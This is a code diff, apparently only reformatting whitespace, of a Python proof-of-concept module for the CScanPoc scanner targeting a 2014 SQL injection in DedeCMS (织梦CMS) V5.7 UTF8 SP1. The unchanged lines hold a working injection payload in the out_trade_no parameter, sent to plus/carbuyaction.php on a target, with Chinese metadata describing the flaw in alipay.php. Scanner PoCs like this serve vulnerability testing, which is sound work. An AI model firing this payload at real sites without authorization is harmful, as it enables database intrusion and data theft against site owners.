@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'DedeCMS_0015' # 平台漏洞编号，留空
+    vuln_id = 'DedeCMS_0015'  # 平台漏洞编号，留空
     name = '织梦CMS-V5.7-UTF8-SP1 sql注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2014-06-06'  # 漏洞公布时间
     desc = '''
         织梦CMS 在/include/payment/alipay.php(lines:125-161) 过滤参数不严谨，导致SQL注入漏洞。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
     product_version = '织梦CMS-V5.7-UTF8-SP1'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '7002ee2c-51ab-42bf-8a57-d8aab29cf50d'
@@ -31,7 +33,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/DedeCMS-V5.7-UTF8-SP1/uploads/plus/carbuyaction.php'
             data = "post_data:dopost=return&code=alipay&out_trade_no=M1T1RN1' or concat(char(@`'`),(SELECT md5(c)))#'"
             url = self.target + payload
@@ -46,6 +48,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
